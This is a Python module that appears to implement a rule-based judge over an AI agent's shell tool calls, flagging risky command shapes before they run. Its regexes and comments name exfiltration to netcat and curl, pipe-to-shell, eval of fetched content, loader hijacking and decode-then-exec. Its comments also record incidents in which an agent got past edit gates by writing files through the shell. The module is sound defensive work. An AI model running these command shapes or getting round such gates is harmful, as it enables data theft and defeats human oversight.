"""Heuristic judge — fast deterministic rules for tool call risk assessment.

Evaluates tool calls against ~40 heuristic rules across 4 risk tiers.
Sub-millisecond latency, no LLM inference. Runs BEFORE tool execution
as a complement to the keyword-based intent_guard.

Risk tiers:
    SAFE        — no concerns detected
    LOW         — informational, log only
    MEDIUM      — needs user awareness
    HIGH        — should be blocked or require confirmation
    CRITICAL    — always blocked, potential security threat

Each rule returns a RuleVerdict with risk tier, description, and evidence.
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from pathlib import Path

# Hidden-Unicode set (zero-width + bidi/RTL/LTR override + tag block).
# Phase 1 of INLINE_UNICODE_HIDING covers these only — no homoglyph
# detection in this batch. Reuses the canonical helper rather than
# redefining the codepoint set.
from .unicode_safety import has_hidden_unicode

# Upload-shape patterns — shared by BASH_NET_UPLOAD (Batch 0,
# pre-existing) and BASH_AUTH_TOKEN_EXFIL (Batch 8, #46 step 5).
# Each pattern matches one specific outbound-payload shape.
# Adding a shape here surfaces it to BOTH rules.
_OUTBOUND_UPLOAD_PATTERNS: tuple[str, ...] = (
    # curl body from file
    r"\bcurl\b.*(?:-d|--data|--data-binary|--data-raw|--data-urlencode)\s+(?:['\"]?@|[^\s'\"]*@)",
    # curl upload via -T / --upload-file
    r"\bcurl\b.*(?:-T|--upload-file)\s+\S",
    # curl multipart with @file
    r"\bcurl\b.*-F\s+['\"]?[^=\s'\"]*=@",
    # curl explicit PUT/POST method flag combined with @file/--upload-file
    r"\bcurl\b.*-X\s+(?:POST|PUT|PATCH)\b.*(?:@|--upload-file)",
    # wget post-file / post-data=@
    r"\bwget\b.*--post-file=",
    r"\bwget\b.*--post-data=@",
    # PowerShell Invoke-WebRequest with -InFile / Post-Method
    r"(?:invoke-webrequest|\biwr\b).*-InFile\b",
    r"(?:invoke-webrequest|\biwr\b).*-Method\s+(?:Post|Put|Patch)",
    # base64 piped into curl body
    r"\bbase64\b.*\|\s*curl\b",
    # curl reading stdin as body (`-d @-`) — common in piped-exfil
    r"\bcurl\b.*-d\s+@-",
    # netcat as outbound channel — `| nc <host> <port>` and
    # `nc -e <cmd> <host> <port>`. Added Batch 8 because
    # token | nc attacker 1337 is a real exfil shape.
    r"\|\s*(?:nc|ncat)\s+\S+\s+\d",
    r"\b(?:nc|ncat)\s+-e\b",
)


def _strip_prose_windows(
    text: str,
    *,
    strip_heredoc: bool = True,
    strip_git_commit_m: bool = True,
    strip_echo_quoted: bool = True,
    strip_python_c: bool = False,
) -> str:
    """Replace prose-text windows in a shell command with whitespace
    so a shell-shape regex doesn't match its own pattern inside text
    arguments. Each window is opt-in — callers pick what's prose for
    their rule's lane.

    Defaults strip the always-prose surfaces (heredoc bodies,
    `git commit -m "..."`, `echo "..."`).

    `strip_python_c` is OFF by default — `python -c` bodies are
    code, not prose, and the inline-rule scanner owns them. Only
    set True when the shell-side rule's pattern would also fire on
    legitimate inline code (BASH_NET_UPLOAD does this; most other
    rules should not).

    `powershell -c "..."` is intentionally never stripped — its body
    legitimately carries shell-invocation syntax we want to catch.
    """
    out = text
    if strip_heredoc:
        out = re.sub(
            r"<<-?\s*'?(\w+)'?.*?^\s*\1\s*$",
            "",
            out,
            flags=re.DOTALL | re.MULTILINE,
        )
    if strip_git_commit_m:
        # ONE definition of the git message window, shared with the policy
        # matchers (#588). The local pattern this replaced was
        # `…(-m|--message=?)\s*(["\']).*?\1` — it stopped at the FIRST closing
        # quote, so `shlex.quote`'s three-chunk rendering of an apostrophe
        # (`'don'"'"'t'`) left most of the prose visible and CFG_* rules kept
        # firing on commit messages that #490 was supposed to have exempted.
        from .shell_data_windows import mask_git_message_values

        out = mask_git_message_values(out)
    if strip_echo_quoted:
        out = re.sub(
            r'\becho\b[^|&;\n]*?(["\'])(?:\\.|(?!\1).)*?\1',
            " ",
            out,
            flags=re.DOTALL,
        )
    if strip_python_c:
        out = re.sub(
            r'\bpython3?\s+-c\s+(["\']).*?\1',
            " ",
            out,
            flags=re.DOTALL,
        )
    return out


# ── #465: pure-sleep spawn detection (polling discipline) ──────────────
#
# Incident 2026-07-18: an agent spawned escalating
# `python -c "import time; time.sleep(N)"` processes via ai_run to poll a
# pending test run — orphaned sleepers piling up on a 4-core box (#456).
# A PURE-sleep spawn is never useful work: waiting has governed
# affordances (ai_run(action='wait'), foreground=true, the 📣 notify).
# The detector refuses ONLY commands whose EVERY top-level statement is a
# sleep shape — `sleep`/`Start-Sleep`/`timeout /t`/inline
# `python -c "time.sleep(N)"` — so legit commands that merely CONTAIN the
# word sleep (paths, strings, test names, `sleep 1 && real-work`) are
# untouched.

SLEEP_SPAWN_RULE_ID = "ai_run.sleep_spawn"

SLEEP_SPAWN_HINT = (
    "Waiting must not spawn a process. Governed alternatives: "
    "ai_run(action='wait', run_id=..., timeout_seconds=...) blocks on an "
    "EXISTING run's completion and returns its tail (no new process); "
    "ai_run(command=..., foreground=true, timeout_seconds=...) runs a "
    "command and waits inline; and every detached run pushes a 📣 "
    "completion notify into your next tool response — do other work, "
    "then read via ai_run(action='output', run_id=...)."
)

# Whole-statement sleep shapes (after top-level splitting).
# PowerShell: `Start-Sleep 30`, `Start-Sleep -Seconds 30`,
# `Start-Sleep -s 5`, `Start-Sleep -Milliseconds 500`.
_SLEEP_START_SLEEP_RE = re.compile(
    r"^start-sleep(?:\s+-(?:s|sec|seconds|m|ms|milliseconds))?\s+\d+(?:\.\d+)?$",
    re.IGNORECASE,
)
_SLEEP_SEGMENT_PATTERNS: tuple[re.Pattern[str], ...] = (
    # coreutils sleep: `sleep 30`, `sleep 0.5`, `sleep 2m`, `sleep 1 2`.
    re.compile(r"^sleep(?:\s+\d+(?:\.\d+)?[smhd]?)+$", re.IGNORECASE),
    _SLEEP_START_SLEEP_RE,
    # cmd.exe pause: `timeout /t 30`, `timeout /t 30 /nobreak`, `timeout 30`
    # (bare-number timeout is the cmd wait; GNU timeout requires a COMMAND
    # argument, which this shape deliberately does not match).
    re.compile(
        r"^timeout(?:\.exe)?\s+(?:/t\s+)?\d+(?:\s+/nobreak)?$",
        re.IGNORECASE,
    ),
)

# Interpreter wrappers whose inline body may be a pure sleep.
_SLEEP_PY_INLINE_RE = re.compile(
    r"^(?:python[0-9.]*|py)(?:\.exe)?\s+(?:-[A-Za-z]\s+)*-c\s+(.+)$",
    re.IGNORECASE,
)
# Python body that is ONLY time-sleep statements (imports + sleep calls).
_SLEEP_PY_BODY_RE = re.compile(
    r"^\s*(?:(?:import\s+time|from\s+time\s+import\s+sleep)\s*[;\n]\s*)*"
    r"(?:(?:time\s*\.\s*)?sleep\(\s*\d+(?:\.\d+)?\s*\)\s*[;\n]?\s*)+$",
)
_SLEEP_PS_INLINE_RE = re.compile(
    r"^(?:powershell|pwsh)(?:\.exe)?\s+(?:-\w+\s+)*-c(?:ommand)?\s+(.+)$",
    re.IGNORECASE,
)
# node -e "setTimeout-only" wait shapes (empty callback / bare timer).
_SLEEP_NODE_INLINE_RE = re.compile(
    r"^node(?:\.exe)?\s+(?:-[A-Za-z]\s+)*(?:-e|--eval)\s+(.+)$",
    re.IGNORECASE,
)
_SLEEP_NODE_BODY_RE = re.compile(
    r"^\s*setTimeout\(\s*(?:\(\)\s*=>\s*\{?\s*\}?|function\s*\(\s*\)\s*\{\s*\})\s*,\s*\d+\s*\)\s*;?\s*$",
)


def _split_top_level_statements(command: str) -> list[str]:
    """Split a shell command on top-level `;`, `&`, `|`, and newlines,
    respecting single/double quotes (an inline `python -c "a; b"` body
    stays one statement). No escape handling — a mis-split only makes the
    detector MORE conservative (a broken segment won't look like a pure
    sleep, so the command is allowed, never wrongly refused)."""
    parts: list[str] = []
    buf: list[str] = []
    quote = ""
    for ch in command.replace("\r\n", "\n"):
        if quote:
            buf.append(ch)
            if ch == quote:
                quote = ""
        elif ch in "\"'":
            quote = ch
            buf.append(ch)
        elif ch in ";&|\n":
            parts.append("".join(buf))
            buf = []
        else:
            buf.append(ch)
    parts.append("".join(buf))
    return parts


def _strip_outer_quotes(text: str) -> str:
    t = text.strip()
    if len(t) >= 2 and t[0] in "\"'" and t[-1] == t[0]:
        return t[1:-1]
    return t


def _statement_is_pure_sleep(segment: str) -> bool:
    seg = segment.strip()
    if not seg:
        return False
    if any(p.match(seg) for p in _SLEEP_SEGMENT_PATTERNS):
        return True
    m = _SLEEP_PY_INLINE_RE.match(seg)
    if m and _SLEEP_PY_BODY_RE.match(_strip_outer_quotes(m.group(1))):
        return True
    m = _SLEEP_PS_INLINE_RE.match(seg)
    if m:
        inner = _strip_outer_quotes(m.group(1)).strip()
        if _SLEEP_START_SLEEP_RE.match(inner):
            return True
    m = _SLEEP_NODE_INLINE_RE.match(seg)
    if m and _SLEEP_NODE_BODY_RE.match(_strip_outer_quotes(m.group(1))):
        return True
    return False


def detect_sleep_spawn(command: str) -> str:
    """Return short evidence when ``command`` is a PURE wait — every
    top-level statement is a sleep shape — else "".

    Pure function, no filesystem/config access. Deliberately conservative:
    a command mixing sleep with real work, or merely containing 'sleep' in
    a path/string/test name, returns "" (allowed).
    """
    if not command or not command.strip():
        return ""
    statements = [s for s in _split_top_level_statements(command) if s.strip()]
    if not statements:
        return ""
    if all(_statement_is_pure_sleep(s) for s in statements):
        return command.strip()[:200]
    return ""


@dataclass(slots=True)
class RuleVerdict:
    rule_id: str
    risk: str  # "safe", "low", "medium", "high", "critical" (telemetry/display)
    description: str
    evidence: str = ""
    recommendation: str = ""

    @property
    def verdict_class(self) -> str:
        """Explicit rule_id → class mapping. Replaces the prior
        "Class-C downgrade" path that used heuristic risk levels for
        gating decisions. See judge_taxonomy.RULE_CLASS for the
        single source of truth.
        """
        # Imported lazily to avoid circular import (judge_taxonomy
        # could theoretically reference heuristic_judge in the future).
        from .judge_taxonomy import classify

        return classify(self.rule_id)

    def to_dict(self) -> dict[str, str]:
        return {
            "rule_id": self.rule_id,
            "risk": self.risk,
            "verdict_class": self.verdict_class,
            "description": self.description,
            "evidence": self.evidence,
            "recommendation": self.recommendation,
        }


@dataclass(slots=True)
class JudgeResult:
    tool_name: str
    verdicts: list[RuleVerdict] = field(default_factory=list)
    # AIDOCS shell provider lock — Batch B (canonical 2026-04-29).
    # provider/transport describe the EXECUTION CONTEXT the command
    # would run under, not properties of individual verdicts.
    #   provider: dialect family ("bash" today; "powershell" reserved
    #             for Batch C — when a real PowerShell judge ships,
    #             evaluate_tool_call will dispatch per provider)
    #   transport: how the command reaches the OS — "ai_run" (AIDOCS-
    #              owned spawn pipeline), "host_native" (raw host
    #              tool, T0-blocked on managed projects), or
    #              "unknown" (non-shell tools — File edits etc., set
    #              explicitly by the dispatcher)
    # Defaults are ``provider="bash"`` and ``transport="ai_run"``
    # because every shell-execution path goes through ai_run on a
    # bash provider in Batch B. evaluate_tool_call OVERRIDES with
    # explicit values per tool_name — for non-shell tools it sets
    # transport="unknown" via _TRANSPORT_FROM_TOOL.get(name, "unknown").
    # Audit consumers read these via summary().
    provider: str = "bash"
    transport: str = "ai_run"

    @property
    def max_risk(self) -> str:
        _ORDER = {"safe": 0, "low": 1, "medium": 2, "high": 3, "critical": 4}
        if not self.verdicts:
            return "safe"
        return max(self.verdicts, key=lambda v: _ORDER.get(v.risk, 0)).risk

    @property
    def should_block(self) -> bool:
        return self.max_risk in ("high", "critical")

    @property
    def clean(self) -> bool:
        return self.max_risk == "safe"

    def decide(self, *, operator_destructive_intent: bool):
        """Return the explicit-taxonomy Decision for this result.

        NEW SURFACE (2026-05-26 confirmation-war split): callers
        should migrate from `should_block` (heuristic risk →
        block-or-confirm) to `decide(operator_destructive_intent=...)`
        which consults the explicit rule_id → class taxonomy. The
        returned Decision carries:
          - decision: allow / ask / block_strike
          - strike: True iff a malicious_forbidden rule fired (caller
            is responsible for calling record_security_strike).
          - triggering_rule_id + reason for audit/UI.
        """
        from .judge_taxonomy import evaluate_verdicts

        return evaluate_verdicts(
            [v.rule_id for v in self.verdicts],
            operator_destructive_intent=operator_destructive_intent,
        )

    def summary(self) -> dict[str, object]:
        return {
            "tool_name": self.tool_name,
            "provider": self.provider,
            "transport": self.transport,
            "max_risk": self.max_risk,
            "should_block": self.should_block,
            "verdict_count": len(self.verdicts),
            "verdicts": [v.to_dict() for v in self.verdicts],
        }


# ── Rule definitions ──

_Rule = tuple[str, str, str]  # (rule_id, risk, description)


def _check_bash_rules(
    command: str,
    project_root: Path | None = None,
    *,
    provider: str = "bash",
    transport: str = "ai_run",
) -> list[RuleVerdict]:
    """Rules for bash/shell command execution.

    The ``provider`` and ``transport`` kwargs describe the execution
    context (Batch B, canonical 2026-04-29). Today the bash rule
    cascade runs uniformly regardless of provider — the universal
    cascade contract pinned by ``test_judge_powershell_routing``.
    The kwargs are accepted so future Batch C dispatch (per-provider
    grammars) can branch here without changing call sites.

    Defaults are ``provider="bash"`` and ``transport="ai_run"``
    because every caller of these internal checkers is a shell-
    execution context, and post-Batch-B ``ai_run`` is the only
    legitimate transport. Callers with a different context override
    via kwarg; no caller currently uses the defaults — they're
    defense-in-depth for future internal callers.
    """
    verdicts: list[RuleVerdict] = []
    # Judge the EXECUTABLE SURFACE: data-only windows (git -m/-F message
    # payloads, heredoc bodies) are masked so a commit message that QUOTES
    # `rm -rf /` / `$(rm x)` / `curl|sh` is not judged as executing it. Real
    # execution outside the data window stays visible. Masked regions never
    # fire a rule, so `evidence=command[:200]` stays accurate.
    from .shell_data_windows import mask_data_windows

    command = mask_data_windows(command)
    lower = command.lower()

    verdicts.extend(_bash_rm_and_pipe_rules(command, lower))
    verdicts.extend(_bash_shell_write_rules(command))
    verdicts.extend(_bash_obfuscation_exfil_rules(command, lower))
    verdicts.extend(_bash_privilege_rules(command, lower))
    verdicts.extend(_bash_container_escape_rules(command, lower))
    verdicts.extend(_bash_fs_write_upload_rules(command, lower))
    verdicts.extend(_bash_platform_destructive_rules(command, lower))
    verdicts.extend(_bash_protected_path_indirection_rules(command, lower, project_root))
    verdicts.extend(_bash_dos_service_rules(command, lower))
    verdicts.extend(_bash_inline_runtime_rules(command, project_root))

    # pytest -n 0 / -p no:xdist explicitly overrides the parallel
    # default in pyproject.toml addopts. That override is worth judging
    # because it silently burns wall-clock time — safety-adjacent rather
    # than pure ergonomics (wasted CI minutes + bad habits compound).
    # The foreground-long-running ergonomic nudge lives in the
    # orchestrator's _background_hint path instead.
    if re.search(r"\bpytest\b", lower):
        if re.search(r"-p\s+no:xdist\b|(?<!\w)-n\s+0\b", lower):
            verdicts.append(
                RuleVerdict(
                    "PYTEST_SERIAL_OVERRIDE",
                    "low",
                    "pytest invoked with xdist disabled.",
                    evidence=command[:200],
                    recommendation=(
                        "Drop `-n 0` / `-p no:xdist` unless a specific test "
                        "module requires single-worker state. Default `-n auto` "
                        "is set in addopts for a reason."
                    ),
                ),
            )

    return verdicts


def _bash_rm_and_pipe_rules(command: str, lower: str) -> list[RuleVerdict]:
    """Recursive-rm family + pipe-to-shell / exec-bypass / loader-hijack rules.

    Extracted from _check_bash_rules (behavior-preserving decomposition,
    backlog #413). Rule order and semantics are unchanged; the entry
    point calls each family helper in the original cascade order.
    """
    verdicts: list[RuleVerdict] = []
    # Recursive-rm detector: match the full `rm -rf <target>` family.
    # Captures flag combinations -r, -R, -rf, -fr, -Rf, etc. Group 1
    # is the target token (up to whitespace or shell separator).
    # Non-recursive `rm file.txt` is NOT destructive-critical — it
    # deletes one file the operator named. Only -r / -R trigger the
    # tree-walk that makes these rules relevant.
    # Recursive-rm shape taxonomy is shared with the destructive floor —
    # ONE definition (destructive_taxonomy) so the judge and the floor can't
    # drift. Non-recursive `rm file` and bounded `rm -rf ./build` / `/tmp/x`
    # produce no verdict (PERMIT); root/wildcard → critical; absolute non-tmp
    # → high (scoped-powerful / confirm). Rule IDs + severities are unchanged.
    from .destructive_taxonomy import TIER_HARD_DENY as _TIER_HARD_DENY
    from .destructive_taxonomy import _RM_RECURSIVE_RE, classify_rm_target

    for m in _RM_RECURSIVE_RE.finditer(command):
        dv = classify_rm_target(m.group(1))
        if dv is None:
            continue  # bounded / scratch cleanup — permit
        verdicts.append(
            RuleVerdict(
                dv.rule_id,
                "critical" if dv.tier == _TIER_HARD_DENY else "high",
                dv.reason,
                evidence=command[:200],
                recommendation=dv.recommendation,
            ),
        )

    # CRITICAL: pipe to shell (curl|bash, wget|sh, etc.)
    if re.search(r"(curl|wget|fetch)\s+.*\|\s*(ba)?sh", lower):
        verdicts.append(
            RuleVerdict(
                "BASH_PIPE_TO_SHELL",
                "critical",
                "Download-then-execute pattern detected.",
                evidence=command[:200],
                recommendation="Download first, inspect, then execute separately.",
            ),
        )

    # ── Batch 2 (#46 step 5): execution/bypass shell family ──
    # Same threat shape as BASH_PIPE_TO_SHELL but different syntax.
    # All three are catch-forbidden per doctrine §0.5 lines 33-39
    # (injection vectors / dangerous chains).

    # CRITICAL: process substitution into shell exec
    # Catches `bash <(curl …)`, `sh <(wget …)`, `source <(curl …)`,
    # `. <(curl …)`, `zsh <(fetch …)`. The `<(…)` form lets the shell
    # treat command output as a file descriptor, and feeding that into
    # bash/sh/source executes it. Mirror of BASH_PIPE_TO_SHELL.
    if re.search(
        r"(?:^|[\s;&|])(?:bash|sh|zsh|source|\.)\s+<\(\s*"
        r"(?:curl|wget|fetch|nc|ncat)\b",
        lower,
    ):
        verdicts.append(
            RuleVerdict(
                "BASH_PROCESS_SUB_EXEC",
                "critical",
                "Process substitution feeding remote content into shell exec.",
                evidence=command[:200],
                recommendation=(
                    "`bash <(curl …)` / `source <(…)` is download-then-"
                    "execute via process substitution. Same threat as "
                    "curl|sh; download, inspect, then execute separately."
                ),
            ),
        )

    # CRITICAL: eval of command substitution that fetches/decodes
    # `eval $(curl …)`, `eval $(base64 -d <<< …)`, `eval $(wget -O- …)`,
    # `eval `curl …`` (backtick form). The shell evaluates the output
    # of an untrusted/decoded command.
    if re.search(
        r"\beval\b\s+(?:\"|')?"
        r"(?:\$\([^)]*\b(?:curl|wget|fetch|base64\s+-d|xxd\s+-r)\b"
        r"|`[^`]*\b(?:curl|wget|fetch|base64\s+-d|xxd\s+-r)\b)",
        lower,
    ):
        verdicts.append(
            RuleVerdict(
                "BASH_EVAL_SUBSHELL",
                "critical",
                "eval of command substitution containing fetch/decode.",
                evidence=command[:200],
                recommendation=(
                    "`eval $(curl …)` / `eval $(base64 -d …)` is the "
                    "obfuscated cousin of curl|sh. Decode and inspect "
                    "first; eval over fetched content has no audit path."
                ),
            ),
        )

    # CRITICAL: dynamic-loader hijack via env var prepend.
    # LD_PRELOAD on Linux/BSD, DYLD_INSERT_LIBRARIES on macOS,
    # plus their *_PATH siblings. Setting these as a command prefix
    # is almost always library hijacking. Legitimate use exists
    # (debugging via libfaketime, profiling) but is operator-tier
    # — keep forbidden, operator can run raw shell if needed.
    if re.search(
        r"(?:^|[\s;&|])"
        r"(?:LD_PRELOAD|LD_LIBRARY_PATH|LD_AUDIT"
        r"|DYLD_INSERT_LIBRARIES|DYLD_LIBRARY_PATH"
        r"|DYLD_FRAMEWORK_PATH)\s*=",
        command,  # case-sensitive — these env vars are always uppercase
    ):
        verdicts.append(
            RuleVerdict(
                "BASH_LD_PRELOAD",
                "critical",
                "Dynamic-loader env var prepended to command — library hijack shape.",
                evidence=command[:200],
                recommendation=(
                    "LD_PRELOAD / DYLD_INSERT_LIBRARIES / sibling vars "
                    "redirect dynamic linking and are the canonical "
                    "library-hijack vector. No operator-confirm path; "
                    "use raw shell if a specific debug workflow needs it."
                ),
            ),
        )
    return verdicts


def _bash_shell_write_rules(command: str) -> list[RuleVerdict]:
    """Shell-mediated file-write rules (Empire directive 2026-05-17).

    Extracted from _check_bash_rules (behavior-preserving decomposition,
    backlog #413). Rule order and semantics are unchanged; the entry
    point calls each family helper in the original cascade order.
    """
    verdicts: list[RuleVerdict] = []
    # ── Shell-mediated file writes (Empire directive 2026-05-17) ──
    # Closes the bypass that drove the 2026-05-17 incident: an agent
    # spawned `python -c "...open('mcp/tests/.../x.py','wb').write(...)..."`
    # via ai_run, which lands bytes on disk at OS level — skipping
    # every MCP edit gate (require_active_task, access_gate, anchored-
    # memory, read-before-edit, audit envelope). The edit gate stack
    # only protects MCP-tool-mediated writes; this judge rule covers
    # the shell side.
    #
    # Shape detection:
    #   * `python -c|m '...' ...open('p','w'|'wb'|...)...` / Path.write_*
    #   * Redirect `> path`, `>> path`
    #   * `tee path`, `tee -a path`
    #   * `cat ... > path`, heredoc `> path`
    #   * `cp src dst`, `mv src dst` (dst is the target written)
    #
    # Severity ladder by TARGET PATH:
    #   critical → AIDOCS surface: .MEMORY/, .aidocs/, .mcp.json,
    #              .claude/, .env, *.sqlite3, *.db
    #   high     → versioned source: relative path with .py/.ts/.tsx/
    #              .js/.jsx/.rs/.go/.java/.c/.cpp/.h/.cs/.rb/.php/.md/
    #              .toml/.yml/.yaml/.json/.html/.css extension
    #   medium   → any other path INCLUDING scratch (/tmp/, /var/tmp/,
    #              C:\temp\, D:\tmp\, /scratch/). DOCTRINE PATCH
    #              (2026-05-26): writes to scratch are NOT
    #              judge-free — a malicious script written to
    #              /tmp/x.sh can still be invoked and exfiltrate.
    #              Only the rm-into-/tmp cleanup path is exempt (a
    #              recoverable cleanup of throwaway data). Every
    #              OTHER target — including a /tmp write — gets at
    #              least a SHELL_WRITE_UNKNOWN attribution verdict so
    #              the operator sees what the agent intends to drop
    #              into the scratch dir.

    _sensitive_target = re.compile(
        r"(?:\.MEMORY[/\\]|\.aidocs[/\\]|\.mcp\.json\b|\.claude[/\\]"
        r"|(?<![A-Za-z0-9_])\.env(?![A-Za-z0-9_])"
        r"|[^\s'\"]*\.(?:sqlite3?|db)(?![A-Za-z0-9_]))",
        re.IGNORECASE,
    )
    _scratch_target = re.compile(
        r"(?:^|[\s'\"=])"
        r"(?:/tmp[/\s]|/var/tmp[/\s]|/var/cache[/\s]|/scratch[/\s]"
        r"|[A-Za-z]:[/\\]temp[/\\]|[A-Za-z]:[/\\]tmp[/\\])",
        re.IGNORECASE,
    )
    _source_target = re.compile(
        r"[^\s'\"]+\.(?:py|pyi|ts|tsx|js|jsx|mjs|cjs|rs|go|java|c|cpp"
        r"|cc|cxx|h|hpp|cs|rb|php|md|mdx|toml|yml|yaml|json|html|css"
        r"|scss|sh|bash|ps1|sql|tf|hcl|proto)$",
        re.IGNORECASE,
    )

    def _classify_write_target(target: str) -> tuple[str, str] | None:
        """Return (rule_id, severity) or None to skip.

        DOCTRINE PATCH (2026-05-26): writes to /tmp/ and other scratch
        paths are NOT auto-exempt. The rm-into-/tmp cleanup path is
        the ONLY judge-free /tmp action (a recoverable throwaway
        delete); a WRITE to /tmp can drop a malicious script that
        gets exec'd later, and a RUN against /tmp/x.sh can exfiltrate
        — both must be visible to the operator. Scratch targets fall
        through to SHELL_WRITE_UNKNOWN (medium) so the operator sees
        the attribution, can audit the payload, and the judge can
        upgrade severity if the content is sensitive.
        """
        t = target.strip().strip("'\"").strip()
        if not t:
            return None
        if _sensitive_target.search(t):
            return ("SHELL_WRITE_SENSITIVE", "critical")
        if _source_target.search(t):
            return ("SHELL_WRITE_SOURCE", "high")
        return ("SHELL_WRITE_UNKNOWN", "medium")

    _shell_write_shapes: list[tuple[str, re.Pattern[str]]] = [
        # python -c|-m "...open('path', '<mode>'..." — quoted path
        # arg followed by a mode string containing 'w', 'a', or 'x'.
        # We scan inside the python invocation directly so heredoc
        # bodies and echo-quoted prose don't mask the shape.
        (
            "python_open",
            re.compile(
                r"\bpython3?\s+-[cm]\b[^\n]*?\bopen\s*\(\s*['\"]"
                r"([^'\"]+?)['\"]\s*,\s*['\"][^'\"]*[wax+][^'\"]*['\"]",
                re.IGNORECASE | re.DOTALL,
            ),
        ),
        # python -c "...Path('p').write_text(...)" / write_bytes
        (
            "python_path_write",
            re.compile(
                r"\bpython3?\s+-[cm]\b[^\n]*?\b(?:pathlib\.)?Path\s*\(\s*['\"]"
                r"([^'\"]+?)['\"]\s*\)\s*\.\s*write_(?:text|bytes)",
                re.IGNORECASE | re.DOTALL,
            ),
        ),
        # > path / >> path redirection (NOT inside python -c quotes;
        # those are handled above; this catches raw shell redirects).
        # Skip the >> 2>&1 style by requiring a path-like token.
        (
            "redirect",
            re.compile(
                r"(?<![<&>])>>?\s+([^\s|&;<>()$]+)",
            ),
        ),
        # tee path / tee -a path
        (
            "tee",
            re.compile(
                r"\btee\s+(?:-a\s+)?([^\s|&;<>()$]+)",
                re.IGNORECASE,
            ),
        ),
        # cp/mv src dst — dst is the write target
        (
            "cp_mv",
            re.compile(
                r"\b(?:cp|mv)\s+(?:-[a-zA-Z]+\s+)*[^\s|&;<>]+\s+([^\s|&;<>]+)",
                re.IGNORECASE,
            ),
        ),
    ]

    _write_seen: set[tuple[str, str]] = set()
    for shape_name, shape_re in _shell_write_shapes:
        for m in shape_re.finditer(command):
            target = m.group(1)
            verdict = _classify_write_target(target)
            if verdict is None:
                continue
            rule_id, risk = verdict
            key = (rule_id, target)
            if key in _write_seen:
                continue
            _write_seen.add(key)
            descriptions = {
                "SHELL_WRITE_SENSITIVE": (
                    "Shell command writes to an AIDOCS-protected "
                    "surface (memory, MCP config, sqlite, credentials)."
                ),
                "SHELL_WRITE_SOURCE": (
                    "Shell command writes to versioned source — bypasses the MCP edit-gate stack."
                ),
                "SHELL_WRITE_UNKNOWN": (
                    "Shell command writes to an unclassified path "
                    "(including /tmp and other scratch dirs as of "
                    "2026-05-26 doctrine — visibility, not a "
                    "judge-free pass). The MCP edit-gate stack is "
                    "bypassed; the orchestrator's path classifier "
                    "owns the actual deny for sensitive externals."
                ),
            }
            recommendations = {
                "SHELL_WRITE_SENSITIVE": (
                    "AIDOCS surfaces (.MEMORY/, .aidocs/, .mcp.json, "
                    ".claude/, .env, *.sqlite3) must never be written "
                    "via shell. Use the MCP tools (memory_capture, "
                    "config_set, project_init, etc.) so the audit "
                    "and gate stack records the change."
                ),
                "SHELL_WRITE_SOURCE": (
                    "Use ai_create_file / ai_replace / ai_insert_lines "
                    "/ ai_batch_edit so the read-before-edit, anchored-"
                    "memory, and access gates fire. Shell writes "
                    "bypass every gate by hitting the FS at OS level."
                ),
                "SHELL_WRITE_UNKNOWN": (
                    "Write target is neither AIDOCS-protected nor "
                    "obviously versioned source — advisory verdict "
                    "for visibility. Scratch dirs (/tmp, /var/tmp, "
                    "C:\\temp, /scratch) are NOT auto-exempt: only "
                    "rm-into-/tmp is judge-free. Use the MCP edit "
                    "tools so the write is attributable and a "
                    "malicious-script drop into /tmp can't slip "
                    "through unattributed."
                ),
            }
            verdicts.append(
                RuleVerdict(
                    rule_id,
                    risk,
                    descriptions[rule_id],
                    evidence=f"shape={shape_name} target={target} :: {command[:150]}",
                    recommendation=recommendations[rule_id],
                ),
            )
    return verdicts


def _bash_obfuscation_exfil_rules(command: str, lower: str) -> list[RuleVerdict]:
    """Obfuscation + exfiltration floor-raising rules (2026-05-17 +).

    Extracted from _check_bash_rules (behavior-preserving decomposition,
    backlog #413). Rule order and semantics are unchanged; the entry
    point calls each family helper in the original cascade order.
    """
    verdicts: list[RuleVerdict] = []
    # ── Obfuscation + exfiltration floor-raising (2026-05-17 +) ──
    # These rules catch the NEXT layer of "trying to hide it" shapes
    # that don't surface in the simple SHELL_WRITE / BASH_PIPE_TO_SHELL
    # detectors. They DO NOT and CANNOT catch arbitrary obfuscation —
    # regex is not Turing-complete enough to recognise every possible
    # encoding of a payload. Hard adversarial obfuscation requires
    # process-level sandboxing or egress firewalling (separate work).
    # The rules below catch the lazy/accidental and the moderately-
    # clever shapes; sophisticated bypass still needs the wall.

    # OBFUSC_DECODE_EXEC — decode+exec pipelines outside eval. Cousin
    # of BASH_EVAL_SUBSHELL (which only catches `eval $(decode...)`).
    if re.search(
        r"\b(?:base64\s+-d|base64\s+--decode|xxd\s+-r|openssl\s+base64\s+-d)\b"
        r"[^|]*\|\s*(?:sh|bash|zsh|fish|python3?|node|ruby|perl)\b",
        lower,
    ) or re.search(
        r"\bpython3?\s+-[cm]\b[^\n]*?\bexec\s*\(\s*"
        r"(?:base64\.b64decode|codecs\.decode|zlib\.decompress"
        r"|bytes\.fromhex|binascii\.unhexlify|__import__)",
        command,
        re.DOTALL,
    ):
        verdicts.append(
            RuleVerdict(
                "OBFUSC_DECODE_EXEC",
                "critical",
                "Decode-then-execute pipeline — payload is obfuscated "
                "before execution, no audit visibility into the real "
                "command. Mirrors curl|sh threat shape.",
                evidence=command[:200],
                recommendation=(
                    "Refuse decode-then-exec unconditionally. If the "
                    "operator needs to run a one-shot script, write the "
                    "decoded payload to disk (via the MCP edit tools so "
                    "it's audited), inspect it, then execute as a normal "
                    "file. exec(base64.b64decode(...)) and base64 -d | sh "
                    "have no legitimate use case in agent traffic."
                ),
            ),
        )

    # OBFUSC_LONG_ENCODED_BLOB — a 200+ char base64-ish blob inside
    # an interpreter -c body is overwhelmingly likely to be encoded
    # payload. Legit code rarely embeds blobs that large inline.
    _interp_body_match = re.search(
        r"\b(?:python3?|bash|sh|zsh|node|ruby|perl)\s+-c\s+"
        r"(['\"])(.+?)\1",
        command,
        re.DOTALL,
    )
    if _interp_body_match:
        _body = _interp_body_match.group(2)
        _b64_match = re.search(r"[A-Za-z0-9+/=]{200,}", _body)
        if _b64_match:
            verdicts.append(
                RuleVerdict(
                    "OBFUSC_LONG_ENCODED_BLOB",
                    "high",
                    "Long encoded blob embedded in interpreter -c body.",
                    evidence=(
                        f"blob_len={len(_b64_match.group(0))} "
                        f"preview={_b64_match.group(0)[:40]}… :: "
                        f"{command[:100]}"
                    ),
                    recommendation=(
                        "Inline base64/hex blobs ≥200 chars in a -c body "
                        "are almost always encoded payload. Write the "
                        "blob to a file via ai_create_file (audited), "
                        "decode and inspect via ai_read_raw, then execute "
